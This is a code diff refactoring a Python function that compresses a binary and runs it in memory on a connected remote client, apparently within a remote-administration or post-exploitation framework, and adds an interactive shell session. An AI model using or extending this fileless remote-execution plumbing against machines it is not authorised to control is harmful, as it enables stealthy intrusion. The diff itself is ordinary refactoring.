@@ -4,36 +4,43 @@
 import os
 import zlib
 import threading
+from modules.lib.utils.cmdrepl import CmdRepl
 
-def mexec(module, path, argv, argv0=None, interactive=False, stdout=True, raw=False, terminate=True):
+def mexec(module, path, argv, argv0=None, interactive=False, raw=False, codepage=None):
     data = zlib.compress(path if raw else open(path).read())
 
     module.mp = module.client.conn.modules.memexec.MExec(
         data, argv0, args = argv,
         no_stdin = not interactive,
-        no_stdor = not stdout,
+        no_stdor = not interactive,
         compressed = True,
-        terminate = terminate
+        terminate = interactive
     )
 
-    module.mp.run()
-
-    completed = threading.Event()
+    complete = threading.Event()
 
     if interactive:
-        def on_read(data, error=False):
-            module.log(data)
+        repl, _ = CmdRepl.thread(
+            module.stdout,
+            module.mp.write,
+            complete,
+            False, None,
+            codepage
+        )
 
-        def on_exit():
-            completed.set()
+        module.client.conn.register_remote_cleanup(
+            module.mp.close
+        )
 
-        stdin = module.mp.get_shell(on_read, on_exit)
+        if module.mp.execute(complete.set, repl._con_write):
+            complete.wait()
+            module.mp.close()
 
-        while not completed.is_set():
-            data = raw_input()
-            stdin.write(data+'\n')
+            module.client.conn.unregister_remote_cleanup(
+                module.mp.close
+            )
 
-    elif stdout:
-        log = module.mp.get_stdout()
-        module.log(log)
-        return log
+            module.success('Process exited. Press ENTER')
+        else:
+            complete.set()
+            module.error('Launch failed. Press ENTER')
